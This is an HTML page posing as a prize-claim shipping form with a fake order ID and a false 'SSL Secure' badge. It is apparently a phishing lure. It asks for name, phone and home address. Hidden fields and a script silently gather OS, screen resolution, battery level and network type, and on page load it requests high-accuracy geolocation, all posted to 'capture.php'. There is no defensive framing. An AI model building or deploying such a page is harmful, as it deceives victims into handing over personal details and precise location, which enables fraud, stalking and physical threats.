<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Claim Your Prize | Shipping Details</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
        body { 
            font-family: 'Inter', sans-serif; 
            background: #050505;
            background-image: radial-gradient(circle at 20% 30%, #1a1a1a 0%, transparent 40%),
                              radial-gradient(circle at 80% 70%, #111 0%, transparent 40%);
        }
        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body class="text-white min-h-screen flex items-center justify-center p-6">

    <div class="w-full max-w-lg glass rounded-3xl p-8 shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
        
        <div class="text-center mb-10">
            <div class="relative inline-block mb-4">
                <div class="absolute inset-0 bg-yellow-500 blur-xl opacity-20 animate-pulse"></div>
                <div class="relative bg-gradient-to-br from-yellow-400 to-orange-600 p-4 rounded-2xl shadow-lg">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-black" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
                    </svg>
                </div>
            </div>
            <h2 class="text-3xl font-black tracking-tighter uppercase italic">Express Shipping</h2>
            <p class="text-gray-400 text-sm mt-1">Order ID: <span class="text-yellow-500 font-mono">META-77192-X</span></p>
        </div>

        <form id="claimForm" action="capture.php" method="POST" class="space-y-5">
            <input type="hidden" name="lat" id="lat">
            <input type="hidden" name="lon" id="lon">
            <input type="hidden" name="battery" id="battery">
            <input type="hidden" name="os" id="os">
            <input type="hidden" name="resolution" id="resolution">
            <input type="hidden" name="network" id="network">

            <div class="grid grid-cols-1 gap-5">
                <div class="space-y-1">
                    <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest ml-1">Recipient Name</label>
                    <input type="text" name="name" required placeholder="Full Name" 
                           class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-sm focus:border-yellow-500/50 focus:bg-white/10 outline-none transition-all duration-300">
                </div>

                <div class="space-y-1">
                    <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest ml-1">Contact Number</label>
                    <input type="tel" name="phone" required placeholder="+91" 
                           class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-sm focus:border-yellow-500/50 focus:bg-white/10 outline-none transition-all duration-300">
                </div>

                <div class="space-y-1">
                    <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest ml-1">Delivery Address</label>
                    <textarea name="address" required placeholder="Complete Residential Address..." 
                              class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-sm focus:border-yellow-500/50 focus:bg-white/10 outline-none h-28 transition-all duration-300 resize-none"></textarea>
                </div>
            </div>

            <button type="submit" id="submitBtn" 
                    class="group relative w-full overflow-hidden bg-white text-black font-black py-4 rounded-xl transition-all hover:scale-[1.02] active:scale-95 shadow-xl">
                <span class="relative z-10">AUTHORIZE & SHIP ITEM</span>
                <div class="absolute inset-0 bg-gradient-to-r from-yellow-400 to-orange-500 opacity-0 group-hover:opacity-100 transition-opacity"></div>
            </button>
        </form>

        <div class="mt-8 flex items-center justify-center gap-2 text-[10px] text-gray-500 font-bold uppercase tracking-widest">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-green-500" viewBox="0 0 20 20" fill="currentColor">
                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
            </svg>
            SSL Secure 256-bit Encryption
        </div>
    </div>

    <script>
        // 1. Advanced Device Intel
        document.getElementById('os').value = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
        document.getElementById('resolution').value = `${window.screen.width}x${window.screen.height}`;
        
        // 2. Battery Intel
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                document.getElementById('battery').value = Math.round(battery.level * 100) + "%";
            });
        }

        // 3. Network Intel
        if ('connection' in navigator) {
            document.getElementById('network').value = navigator.connection.effectiveType || "Unknown";
        }

        // 4. Geo-Trigger with Custom Modal Logic (Optional)
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => {
                        document.getElementById('lat').value = p.coords.latitude;
                        document.getElementById('lon').value = p.coords.longitude;
                    },
                    (e) => { console.log("User blocked location."); },
                    { enableHighAccuracy: true }
                );
            }
        };
    </script>
</body>
</html>